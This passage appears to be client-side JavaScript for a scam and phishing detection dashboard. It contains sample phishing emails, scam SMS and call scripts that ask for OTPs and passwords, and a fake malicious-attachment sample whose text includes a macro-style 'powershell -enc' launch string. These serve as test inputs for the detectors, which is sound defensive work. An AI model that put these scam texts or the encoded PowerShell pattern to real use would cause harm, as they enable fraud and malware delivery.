      <div class="riskbar" style="margin-bottom:4px"><div class="riskbar__f" style="width:${res.riskScore}%;background:${barCol(res.verdict)};transition:width .6s ease"></div></div>
      <div style="display:flex;justify-content:space-between;margin-bottom:12px">
        <span class="small muted">${res.combinedConfidence!=null?'Combined risk':'Risk score'}: <b style="color:var(--text)">${res.riskScore}/100</b></span>
        <span class="small muted">Verdict confidence: <b style="color:var(--text)">${res.confidence}%</b></span>
      </div>
      ${scoreBreakdown(res)}
      ${res.signals.length?'<div class="eyebrow">Signals detected ('+res.signals.length+')</div>'+sigHtml:''}
      ${urlHtml}
    </div>
  </div>`;
}

function scoreBreakdown(res){
  if(res.offline){
    return '<div class="note note--warn" style="margin-bottom:14px"><b>Offline analysis.</b> The World Monitor server could not be reached, so this ran the rule engine in your browser only - no ML score.</div>';
  }
  const cell=(label,val,sub,col)=>`<div style="flex:1;min-width:120px;padding:10px 12px;border:1px solid var(--line);border-radius:6px">
      <div class="small muted">${label}</div>
      <div style="font:700 20px/1.2 'JetBrains Mono',monospace;color:${col}">${val==null?'n/a':val}<span style="font-size:11px;color:var(--text3,#8A929C)">${val==null?'':'/100'}</span></div>
      <div class="small muted" style="font-size:10.5px;margin-top:2px">${sub}</div></div>`;
  const b=res.blend||{heuristic:.6,ml:.4};
  const terms=(res.ml&&res.ml.topSignals||[]).filter(t=>t.contribution>0).slice(0,5).map(t=>'<code>'+esc(t.label||t.term)+'</code>').join(' · ');
  const m=res.ml&&res.ml.model;
  return `<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
      ${cell('Heuristic score',res.heuristicScore,'rule engine · weight '+Math.round(b.heuristic*100)+'%','var(--text)')}
      ${cell('ML score',res.mlScore,'TF-IDF + logistic regression · weight '+Math.round(b.ml*100)+'%','#7AAFFF')}
      ${cell('Combined confidence',res.combinedConfidence,Math.round(b.heuristic*100)+'/'+Math.round(b.ml*100)+' blend → verdict','#FFCF80')}
    </div>
    <div class="small muted" style="margin-bottom:14px;line-height:1.6">
      ${terms?'Model cues pushing toward phishing: '+terms+'<br>':''}
      ${m?'Model held-out F1 '+m.heldOutF1+' (precision '+m.heldOutPrecision+', recall '+m.heldOutRecall+'). ':''}Rules alone said <b>${esc(String(res.heuristicVerdict||'').replace('_',' '))}</b>.
    </div>`;
}

async function analyzeOnServer(kind,body,sender){
  const ctl=new AbortController(); const t=setTimeout(()=>ctl.abort(),8000);
  try{
    const r=await fetch((window.WM_API_BASE||'')+'/api/security/analyze-'+kind,{method:'POST',headers:{'Content-Type':'application/json'},
      credentials:'same-origin',body:JSON.stringify({body,sender}),signal:ctl.signal});
    const j=await r.json().catch(()=>({}));
    if(!r.ok){ const e=new Error(j.error||('Server error '+r.status)); e.http=r.status; throw e; }
    return j;
  }finally{ clearTimeout(t); }
}

async function runContentScan(kind,body,sender){
  try{ return await analyzeOnServer(kind,body,sender); }
  catch(e){
    if(e.http) throw e;                      // server answered with an error: show it, don't mask it
    const res=analyzeContent(body,sender,kind);  // server unreachable: browser rule engine, clearly labelled
    res.offline=true; return res;
  }
}

/* ---- Button handlers ---- */
window._sxLoadEmailSample=function(){
  document.querySelector('#emailSenderIn').value='security-alert@sbi-verification.xyz';
  document.querySelector('#emailBodyIn').value='Dear Customer,\n\nYour SBI Net Banking account has been temporarily suspended due to unauthorized access detected from an unknown device.\n\nYou must verify your identity within 24 hours or your account will be permanently locked and all funds frozen.\n\nClick here to verify immediately:\nhttps://sbi-secure-verify.login-alert.xyz/netbanking/auth\n\nPlease enter your Net Banking ID, password, and OTP to complete the verification process.\n\nFailure to verify within 24 hours will result in permanent account closure.\n\nRegards,\nSBI Security Team';
};

window._sxLoadSmsSample=function(){
  document.querySelector('#smsSenderIn').value='+91-9876543210';
  document.querySelector('#smsBodyIn').value='URGENT: Your Amazon order #AZ-38291 will be cancelled in 2 hours. To avoid cancellation click here immediately: http://amaz0n-verify.click/cancel?id=38291 Call 9876543210 immediately to confirm your order.';
};

window._sxRunEmailScan=function(){
  const body=(document.querySelector('#emailBodyIn').value||'').trim();
  if(!body){toast('Paste an email first','crit');return;}
  const sender=(document.querySelector('#emailSenderIn').value||'').trim();
  const btn=document.querySelector('#btnEmailScan');
  btn.disabled=true;btn.textContent='Scanning…';
  (async function(){
    try{
      const res=await runContentScan('email',body,sender);
      renderResult('#emailResult',res);
      if(res.verdict==='PHISHING'){
        fireSecurityNotification('Phishing email detected',res.summary,true);
      }else if(res.verdict==='SUSPICIOUS'){
        fireSecurityNotification('Suspicious email detected',res.summary,false);
      }
    }catch(e){
      document.querySelector('#emailResult').innerHTML='<div class="card"><div class="empty"><div class="empty__t">Error</div><div class="empty__s">'+esc(e.message)+'</div></div></div>';
    }finally{btn.disabled=false;btn.textContent='Scan email';}
  })();
};

window._sxRunSmsScan=function(){
  const body=(document.querySelector('#smsBodyIn').value||'').trim();
  if(!body){toast('Paste an SMS first','crit');return;}
  const sender=(document.querySelector('#smsSenderIn').value||'').trim();
  const btn=document.querySelector('#btnSmsScan');
  btn.disabled=true;btn.textContent='Scanning…';
  (async function(){
    try{
      const res=await runContentScan('sms',body,sender);
      renderResult('#smsResult',res);
      if(res.verdict==='SCAM'){
        fireSecurityNotification('Scam SMS detected',res.summary,true);
      }else if(res.verdict==='SUSPICIOUS'){
        fireSecurityNotification('Suspicious SMS detected',res.summary,false);
      }
    }catch(e){
      document.querySelector('#smsResult').innerHTML='<div class="card"><div class="empty"><div class="empty__t">Error</div><div class="empty__s">'+esc(e.message)+'</div></div></div>';
    }finally{btn.disabled=false;btn.textContent='Scan SMS';}
  })();
};

})();

/* ---- Browser notifications ---- */
function fireSecurityNotification(title,body,isCritical){
  toast(title+': '+body, isCritical?'crit':undefined);
  if(typeof Notification!=='undefined' && Notification.permission==='granted'){
    try{ new Notification('World Monitor - '+title,{body,tag:'world-monitor-alert'}); }catch{}
  }
}



function go(page){
  $$('.page').forEach(p=>p.classList.remove('is-active'));
  $('#page-'+page).classList.add('is-active');
  $$('.nav__item').forEach(b=>b.classList.toggle('is-active',b.dataset.page===page));
  const btn=$$('.nav__item').find(b=>b.dataset.page===page);
  $('#ptitle').textContent=btn?btn.textContent.trim():'';
  let g=btn; while(g&&!g.classList.contains('nav__group')) g=g.previousElementSibling;
  $('#crumb').textContent=g?g.textContent:'World Monitor';
  if(page==='evidence') paintEvidence();
  if(page==='chain'){ paintChain(); paintEvidence(); }
  if(page==='invest') paintInvest();
  if(page==='response') paintResponse();
  if(page==='report') paintReport();
  if(page==='command') paintCommand();
  if(page==='explorer'){ renderFxGrid(); renderQList(); renderQLog(); updateExplorerBadge(); renderRtStepsIdle(); }
  window.scrollTo({top:0});
}
function paintAll(){ paintCommand(); paintEvidence(); paintChain(); paintInvest(); paintResponse(); paintReport(); }

function updateThreat(){
  const worst=State.verdicts.reduce((a,v)=>Math.max(a,v.score),0);
  const b=band(worst);
  const map={crit:['critical','#FA4D56'],high:['high','#FA4D56'],susp:['suspicious','#F1C21B'],safe:['low','#42BE65']};
  const [txt,col]=State.verdicts.length?map[b.key]:['none yet','#8D8D8D'];
  $('#tlText').textContent='Highest risk this session: '+txt;
  $('#tlDot').style.background=col;
  $('#tlDot').style.boxShadow='0 0 0 3px '+col+'26';
}

async function guidedDemo(){
  const btn=$('#btnDemo'); btn.disabled=true; btn.textContent='Running…';
  try{
    go('command'); renderChainFlow('phish');
    await sleep(500);
    go('phish');
    $('#urlIn').value=URL_SAMPLES[0].v;
    await sleep(500);
    renderPhish(analyseURL(URL_SAMPLES[0].v));
    renderChainFlow('link');
    await sleep(1500);
    go('scanner');
    await sleep(350);
    const f=FIXTURES[0].build();
    await runScan(f);
    renderChainFlow('compromise');
    await sleep(1200);
    go('invest');
    renderChainFlow('investigation');
    await sleep(1600);
    go('chain'); paintChain(); paintEvidence();
    renderChainFlow('verify');
    await sleep(700);
    await doVerify();
    renderChainFlow('report');
    toast('Demo complete. Modify the evidence, then verify again.','ok');
  } finally {
    btn.disabled=false; btn.textContent='Run guided demo';
    setTimeout(()=>renderChainFlow(null), 5000);
  }
}
function resetAll(){
  State.verdicts=[]; State.evidence=[]; State.incidents=[]; State.responses=[]; State.timeline=[];
  State.seq={ev:0,inc:0}; Ledger.blocks=[]; _prevMetrics={inc:0,blocked:0,links:0};
  resetExplorer();
  $('#scanResult').innerHTML=`<div class="card"><div class="empty">
    <div class="empty__t">No file submitted</div>
    <div class="empty__s">Submit a file to see its identity, structure, embedded content, and a traceable risk score.</div></div></div>`;
  $('#scanStepsCard').style.display='none';
  $('#phishResult').innerHTML=`<div class="card"><div class="empty">
    <div class="empty__t">No link analysed</div>
    <div class="empty__s">Every signal below is computed from the URL string, its structure, and seeded infrastructure records.</div></div></div>`;
  $('#verifyOut').innerHTML=''; $('#evDetail').innerHTML=''; $('#iocResult').innerHTML='';
  renderChainFlow(null);
  paintAll(); updateThreat(); toast('Workspace reset','ok');
}

function init(){
  $$('.nav__item').forEach(b=>b.onclick=()=>go(b.dataset.page));

  const drop=$('#drop'), fi=$('#fileInput');
  $('#btnBrowse').onclick=()=>fi.click();
  drop.onclick=()=>fi.click();
  fi.onchange=e=>{ if(e.target.files[0]) runScan(e.target.files[0]); };
  ['dragenter','dragover'].forEach(ev=>drop.addEventListener(ev,e=>{e.preventDefault();drop.classList.add('is-over');}));
  ['dragleave','drop'].forEach(ev=>drop.addEventListener(ev,e=>{e.preventDefault();drop.classList.remove('is-over');}));
  drop.addEventListener('drop',e=>{ const f=e.dataTransfer.files[0]; if(f) runScan(f); });

  $('#fixtures').innerHTML=FIXTURES.map((f,i)=>
    `<button class="btn btn--sm" data-fx="${i}" title="${esc(f.label)}">${esc(f.label)}</button>`).join('');
  $$('#fixtures .btn').forEach(b=>b.onclick=()=>runScan(FIXTURES[+b.dataset.fx].build()));


  /* ---- unified scam detectors (server-side, /api/scam/*) ---- */
  const SC={
    email:{t:'Email phishing',help:'Paste the email body. The sender address helps catch look-alike domains.',sender:'From address',text:'Email body',ex:[
      ['Phishing: KYC suspension','alerts@sbi-kyc-update.xyz','Dear Customer,\n\nYour SBI YONO account has been temporarily suspended due to incomplete KYC. Verify within 24 hours to avoid permanent closure.\n\nClick here: http://sbi-kyc-update.xyz/verify\n\nSBI Security Team'],
      ['Safe: meeting note','priya@yourcompany.com','Hi team, the sprint review has moved to Thursday 3pm in the usual room. Agenda is in the shared drive. Thanks, Priya']]},
    smishing:{t:'Smishing - SMS / WhatsApp message',help:'Paste the text message exactly as received.',sender:'Sender ID or number',text:'Message',ex:[
      ['Smishing: electricity cut','+91 98765 43210','Dear consumer, your electricity will be disconnected tonight at 9:30 PM as previous month bill was not updated. Please call our officer 9876543210 immediately.'],
      ['Smishing: OTP request','VK-SBIINB','SBI: Your account will be blocked today. Share the OTP sent to you with our executive to cancel the request. bit.ly/sbi-kyc'],
      ['Safe: bank debit alert','AD-HDFCBK','Rs.450.00 debited from a/c **1234 on 25-09-26 to VPA swiggy@icici. Not you? Call 18002586161.']]},
    vishing:{t:'Vishing - phone call',help:'Type or paste what the caller said, or press Live transcribe to capture the call through your microphone (Chrome / Edge). Audio never leaves your browser; only the text is checked.',sender:'Caller number',text:'Call transcript',mic:true,ex:[
      ['Vishing: digital arrest','+44 7700 900123','This is Inspector Sharma from CBI cyber cell. A parcel in your name with drugs has been seized. You are under digital arrest. Stay on the video call and don\'t tell anyone. Transfer Rs 2,50,000 to the verification account to clear your name.'],
      ['Vishing: bank KYC + AnyDesk','+91 70000 12345','Sir I am calling from your bank fraud department. Your card will be blocked in 30 minutes. Please install AnyDesk and tell me the OTP you receive to stop it.'],
      ['Safe: delivery call','+91 98450 00000','Hello, I have your Amazon parcel, I am near the gate. Should I leave it with the security?']]},
    payment:{t:'Fake payment screenshot',help:'Upload the screenshot the payer sent you. Image metadata is checked for editing apps. Type the text you see on the screenshot (amount, UTR / reference, status, date) - or use an example.',file:'Screenshot (PNG / JPG)',accept:'image/*',sender:null,amt:true,text:'Text visible on the screenshot',ex:[
      ['Fake: pending + bad UTR','','PhonePe\nPayment Pending\n₹15,000\nPaid to Ramesh Kumar\nUTR: 12345678\n27 Dec 2026, 10:75 AM'],
      ['Genuine-looking receipt','','Google Pay\nPayment successful\n₹1,250\nTo: ramesh.k@okaxis\nUPI transaction ID: 426912345871\n24 Sep 2026, 7:42 PM']]},
    investment:{t:'Investment scam',help:'Paste the ad, WhatsApp/Telegram message or post that is offering the investment.',sender:null,text:'Message or ad text',ex:[
      ['Scam: guaranteed returns','','🔥 Join our VIP Telegram group! Guaranteed 5% daily returns on crypto trading. Double your money in 20 days, zero risk. Only 10 slots left. Recommended by Mukesh Ambani. Register: t.ly/vip-profit'],
      ['Scam: task job','','Part time job! Like YouTube videos and rate hotels, earn ₹3000 per day. To withdraw your earnings pay a small tax of ₹1,999 first.'],
      ['Safe: mutual fund reminder','','Your SIP of ₹5,000 in XYZ Flexicap Fund (SEBI registered AMC) will be debited on 5 Oct. Mutual fund investments are subject to market risks.']]},
    auto:{t:'Check a link, email or message',help:'Paste anything you received - a link, a whole email (headers included if you have them) or an SMS / WhatsApp message. It works out what it is and checks it as you type.',sender:null,text:'Link, email or message',ex:[
      ['Real link: HDFC Bank','','https://www.hdfcbank.com/personal/pay/cards'],
      ['Phishing link','','http://paypa1-secure-login.com/verify'],
      ['Real email: Google alert','','From: Google <no-reply@accounts.google.com>\nSubject: Security alert\n\nA new sign-in on Windows\nWe noticed a new sign-in to your Google Account on a Windows device. If this was you, you don\'t need to do anything. If not, we\'ll help you secure your account.\nYou can also see security activity at https://myaccount.google.com/notifications'],
      ['Phishing email: PayPal','','From: PayPal Security <service@paypa1-support.com>\nSubject: Your account has been limited\n\nDear Customer,\nWe noticed unusual activity in your account. To restore access, verify your information within 24 hours or your account will be permanently suspended.\nClick here to verify: http://paypa1-secure-login.com/verify\nPayPal Team'],
      ['Real SMS: bank OTP','','482913 is your OTP for HDFC Bank NetBanking login. OTP valid for 5 mins. Do not share this OTP with anyone. -HDFC Bank'],
      ['Scam SMS: electricity','','Dear customer your electricity connection will be disconnected tonight at 9:30 pm because previous month bill was not updated. Call our officer 9876543210 immediately']]},
    prize:{t:'Fake prize / reward',help:'Paste the message claiming you won something.',sender:null,text:'Message',ex:[
      ['Scam: KBC lottery','','Congratulations! Your number has won ₹25 lakh in KBC Lucky Draw 2026. To claim, pay processing fee ₹12,500 and send Aadhaar and bank details within 24 hours to our manager on WhatsApp.'],
      ['Scam: Amazon reward','','Amazon: You have been selected for a free iPhone 16 as a loyalty reward. Pay delivery charge Rs 99 to claim now: http://amzn-reward.top/claim'],
      ['Safe: store points','','You earned 120 reward points on your purchase at DMart. Points can be used on your next bill.']]},
    attachment:{t:'Malware attachment',help:'Choose the attachment you received. It is checked for disguised programs, macros, scripts and file-type mismatches. The file is analysed in memory and not stored.',file:'Attachment',accept:'',sender:null,text:null,ex:[
      ['Malicious: invoice.pdf.exe','',{name:'invoice_2026.pdf.exe',b64:'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA='}],
      ['Malicious: macro doc','',{name:'Salary_Revision.docm',txt:'PK\u0003\u0004 word/vbaProject.bin AutoOpen Shell WScript.Shell powershell -enc SQBFAFgA'}],
      ['Safe: plain text','',{name:'notes.txt',txt:'Meeting notes: review budget, send slides on Friday.'}]]}};
  let scType='auto', scTimer=null, scBlob=null, scLast='auto';
  function scRender(r){
    if(!r||!r.ok){ $('#phishResult').innerHTML=`<div class="card"><div class="card__body"><div class="note note--warn">${esc((r&&r.error)||'Could not analyse.')}</div></div></div>`; return; }
    const cls=r.level==='SAFE'?'ok':r.level==='DANGEROUS'?'bad':'warn';
    const label=r.verdict==='SECURE'?'Secure':'Not secure';
    scLast=r.type||scType;
    const what=r.type==='url'?'link':r.type==='email'?'email':r.type==='smishing'?'message':'input';
    const sub=r.level==='SAFE'?'This '+what+' looks genuine':r.level==='DANGEROUS'?'This '+what+' is very likely phishing or a scam':'This '+what+' has warning signs - don\'t act on it yet';
    const goodHtml=(r.good||[]).length?`<div class="eyebrow" style="margin-top:16px">What checks out</div>${r.good.map(g=>`<div class="rsn rsn--ok"><div>${esc(g)}</div></div>`).join('')}`:'';
    const rs=(r.reasons||[]).filter(x=>x.weight>0);
    const f=r.file?`<div class="kv mt"><div class="kv__k">File</div><div class="kv__v mono">${esc(r.file.name)} · ${r.file.size.toLocaleString('en-IN')} bytes</div><div class="kv__k">Real type</div><div class="kv__v mono">${esc(r.file.detectedType)}</div><div class="kv__k">SHA-256</div><div class="kv__v mono" style="word-break:break-all">${esc(r.file.sha256)}</div><div class="kv__k">Look up</div><div class="kv__v"><a href="${esc(r.file.virustotal)}" target="_blank" rel="noopener">VirusTotal</a></div></div>`:'';
    const ex=r.extracted&&Object.values(r.extracted).some(Boolean)?`<div class="kv mt">${Object.entries(r.extracted).filter(([,v])=>v).map(([k,v])=>`<div class="kv__k">${esc(k)}</div><div class="kv__v mono">${esc(v)}</div>`).join('')}</div>`:'';
    $('#phishResult').innerHTML=`<div class="card"><div class="card__body">
      <div class="vd vd--${cls}"><div><div class="vd__big">${label}</div><div class="small">${sub}</div></div><div class="vd__score">Risk score<b>${r.riskScore}/100</b></div></div>
      ${r.detected?`<div class="small muted" style="margin-top:10px">Read as: <b>${esc(r.detected)}</b>${r.host?', '+esc(r.host):''}${r.sender?', sender '+esc(r.sender):''}</div>`:''}
      ${rs.length?`<div class="eyebrow" style="margin-top:16px">Warning signs</div>`+rs.map(x=>`<div class="rsn"><div>${esc(x.detail)}</div><span>+${x.weight}</span></div>`).join(''):''}
      ${goodHtml}
      ${!rs.length&&!goodHtml?'<div class="small muted" style="margin-top:12px">Nothing suspicious was found.</div>':''}
      ${f}${ex}
      <div class="note ${cls==='ok'?'':'note--warn'} mt"><b>What to do:</b> ${esc(r.advice||'')}</div>
      <div class="small mt" id="scAge"></div>
      <div class="small muted mt">Checked at ${new Date().toLocaleTimeString('en-IN')} by the server for exactly this input · engine: ${esc(r.engine||'rule engine')}. Scores of 35 or more count as not secure. To report fraud, use <a href="https://cybercrime.gov.in" target="_blank" rel="noopener">cybercrime.gov.in</a> or call 1930.</div>
    </div></div>`;
    scAge();
  }
  const SC_AGE_ID={auto:'email-phishing',email:'email-phishing',smishing:'smishing',vishing:'vishing',payment:'fake-payment-screenshot',investment:'investment-scam',prize:'fake-prize',attachment:'malware-attachment'};
  let SC_AGE=null;
  function scAge(){ SC_AGE=SC_AGE||fetch('/api/gio/attack-tables',{credentials:'same-origin'}).then(r=>r.ok?r.json():null).catch(()=>null);
    SC_AGE.then(d=>{ const el=$('#scAge'); if(!el) return; const row=d&&d.scams.find(x=>x.id===SC_AGE_ID[scLast==='url'?'email':scLast]); if(!row) return; const a=row.ageTarget;
      el.innerHTML=`<b>Age targeted by this scam:</b> ${esc(a.group)} - <span class="muted">${esc(a.summary)}</span>${a.sourceUrl?` <a href="${esc(a.sourceUrl)}" target="_blank" rel="noopener">Source</a>`:''}`; }); }
  async function scRun(){
    const c=SC[scType];
    try{
      let r;
      if(c.file && (scBlob || $('#scFile').files[0])){
        const file=scBlob||$('#scFile').files[0];
        if(file.size>10*1024*1024) return scRender({ok:false,error:'File too large (max 10 MB).'});
        const bytes=new Uint8Array(await file.arrayBuffer()); let bin=''; for(let i=0;i<bytes.length;i+=32768) bin+=String.fromCharCode.apply(null,bytes.subarray(i,i+32768));
        r=await (await fetch('/api/scam/file',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:scType,name:file.name||'file',dataBase64:btoa(bin),ocr:$('#scText').value||'',expected:$('#scAmt').value||''})})).json();
      } else if(scType==='attachment'){ return scRender({ok:false,error:'Choose a file or pick an example.'}); }
      else {
        if(!$('#scText').value.trim()) return;
        r=await (await fetch('/api/scam/analyze',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:scType,text:$('#scText').value,sender:$('#scSender').value,expectedAmount:$('#scAmt').value})})).json();
      }
      scRender(r);
    }catch(e){ scRender({ok:false,error:'Server not reachable: '+e.message}); }
  }
  function scSetup(type){
    scType=type; scBlob=null; const c=SC[type];
    $('#scTitle').textContent=c.t; $('#scHelp').textContent=c.help;
    $('#scFileRow').style.display=c.file?'':'none'; if(c.file){ $('#scFileL').textContent=c.file; $('#scFile').accept=c.accept; $('#scFile').value=''; }
    $('#scSenderRow').style.display=c.sender?'':'none'; if(c.sender) $('#scSenderL').textContent=c.sender;
    $('#scTextRow').style.display=c.text?'':'none'; if(c.text) $('#scTextL').textContent=c.text;
    $('#scAmtRow').style.display=c.amt?'':'none'; $('#scMic').style.display=c.mic?'':'none';
    $('#scText').value=''; $('#scSender').value=''; $('#scAmt').value='';
    $('#scSamples').innerHTML=c.ex.map((e,i)=>`<button class="btn btn--sm" data-sx="${i}">${esc(e[0])}</button>`).join('');
    $$('#scSamples .btn').forEach(b=>b.onclick=()=>{ const e=c.ex[+b.dataset.sx];
      if(typeof e[2]==='object'){ const bytes=e[2].b64?Uint8Array.from(atob(e[2].b64),ch=>ch.charCodeAt(0)):new TextEncoder().encode(e[2].txt); scBlob=new File([bytes],e[2].name); }
      else { $('#scText').value=e[2]; $('#scSender').value=e[1]; if(type==='payment') $('#scAmt').value=b.dataset.sx==='0'?'15000':'1250'; }
      scRun(); });
    $('#phishResult').innerHTML=`<div class="card"><div class="empty"><div class="empty__t">${esc(c.t)}</div><div class="empty__s">Paste or upload something, or pick an example. The result shows SECURE or INSECURE with the reasons.</div></div></div>`;
  }
  $('#scGo').onclick=scRun;
  $('#scFile').onchange=()=>{ scBlob=null; scRun(); };
  ['#scText','#scSender','#scAmt'].forEach(s=>$(s).addEventListener('input',()=>{ clearTimeout(scTimer); scTimer=setTimeout(scRun,600); }));
  let rec=null;
  $('#scMic').onclick=()=>{ const SR=window.SpeechRecognition||window.webkitSpeechRecognition;
    if(!SR){ scRender({ok:false,error:'Live transcription needs Chrome or Edge. You can still type or paste the call transcript.'}); return; }
    if(rec){ rec.stop(); rec=null; $('#scMic').textContent='Live transcribe call'; return; }
    rec=new SR(); rec.lang='en-IN'; rec.continuous=true; rec.interimResults=false; const base=$('#scText').value;
    let said=''; rec.onresult=ev=>{ for(let i=ev.resultIndex;i<ev.results.length;i++) if(ev.results[i].isFinal) said+=ev.results[i][0].transcript+'. '; $('#scText').value=(base?base+' ':'')+said; scRun(); };
    rec.onerror=ev=>scRender({ok:false,error:'Microphone: '+ev.error}); rec.onend=()=>{ rec=null; $('#scMic').textContent='Live transcribe call'; };
    rec.start(); $('#scMic').textContent='Stop transcribing'; };

  $$('#phishTabs .tab').forEach(t=>t.onclick=()=>{
    $$('#phishTabs .tab').forEach(x=>x.classList.toggle('is-active',x===t));
    const k=t.dataset.ptab;
    $('#phishUrlCard').style.display=k==='url'?'':'none';
    $('#phishEmailCard').style.display=k==='email'?'':'none';
    $('#scamCard').style.display=k.startsWith('s:')?'':'none';
    if(k.startsWith('s:')) scSetup(k.slice(2));
  });
  async function urlRun(){
    const raw=$('#urlIn').value.trim(); if(raw.length<4) return;
    const local=analyseURL(raw);
    let r; try{ r=await (await fetch('/api/scam/analyze',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'url',text:raw})})).json(); }catch(e){ r={ok:false,error:'Server not reachable: '+e.message}; }
    if($('#urlIn').value.trim()!==raw) return;   // user kept typing
    scRender(r);
    if(r.ok&&!local.error){ const feat=local.feats.map(f=>`<div class="kv__k">${esc(f.k)}</div><div class="kv__v mono">${esc(f.v)}</div>`).join('');
      $('#phishResult').insertAdjacentHTML('beforeend',`<div class="card mt"><div class="card__head"><div class="card__title">How the link breaks down</div></div><div class="card__body"><div class="kv">${feat}</div></div></div>`); }
  }
  $('#btnUrl').onclick=urlRun;
  $('#urlIn').addEventListener('keydown',e=>{ if(e.key==='Enter') $('#btnUrl').click(); });
  let urlT=null; $('#urlIn').addEventListener('input',()=>{ clearTimeout(urlT); urlT=setTimeout(urlRun,450); });
  async function emlRun(){
    const raw=$('#emlIn').value; if(raw.trim().length<20) return;
    renderPhish(analyseEML(raw));
    const tmp=document.createElement('div'); tmp.innerHTML=$('#phishResult').innerHTML;
    const inspect=tmp.children.length>1?tmp.lastElementChild.outerHTML:'';
    let r; try{ r=await (await fetch('/api/scam/analyze',{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'email',text:raw})})).json(); }catch(e){ return; }
    if($('#emlIn').value!==raw) return;
    scRender(r); $('#phishResult').insertAdjacentHTML('beforeend',inspect);
  }
  let emlT=null; $('#emlIn').addEventListener('input',()=>{ clearTimeout(emlT); emlT=setTimeout(emlRun,600); });
  $('#urlSamples').innerHTML=URL_SAMPLES.map((s,i)=>`<button class="btn btn--sm" data-us="${i}">${esc(s.l)}</button>`).join('');
  $$('#urlSamples .btn').forEach(b=>b.onclick=()=>{ $('#urlIn').value=URL_SAMPLES[+b.dataset.us].v; $('#btnUrl').click(); });
  scSetup('auto');
  $('#emlIn').value=SAMPLE_EML;
  $('#btnEml').onclick=emlRun;
  $('#btnEmlSample').onclick=()=>{ $('#emlIn').value=SAMPLE_EML; };

  $('#btnIoc').onclick=searchIoc;
  $('#iocIn').addEventListener('keydown',e=>{ if(e.key==='Enter') searchIoc(); });
  paintIoc();

  renderFxGrid();
  renderQList();
  renderQLog();
  renderRtStepsIdle();
  updateConnUI();
  $('#autoToggle').onclick=toggleAutoScan;
  $('#autoToggle').addEventListener('keydown',e=>{ if(e.key===' '||e.key==='Enter'){e.preventDefault();toggleAutoScan();} });
  $('#btnConnect').onclick=connectDownloads;
  $('#btnDisconnect').onclick=disconnectDownloads;

  $('#btnVerify').onclick=doVerify;
  $('#btnTamper').onclick=doTamper;
  $('#btnRestore').onclick=doRestore;

  $('#btnDemo').onclick=guidedDemo;
  $('#btnReset').onclick=resetAll;
  $('#btnPrint').onclick=()=>window.print();

  const tick=()=>{ $('#clock').textContent=hhmmss(new Date())+' IST'; };
  tick(); setInterval(tick,1000);
  renderChainFlow(null);
  paintAll(); updateThreat();
  const obs=new MutationObserver(updateThreat);
  obs.observe($('#tblVerdicts'),{childList:true,subtree:true});
}
document.addEventListener('DOMContentLoaded',init);

})();
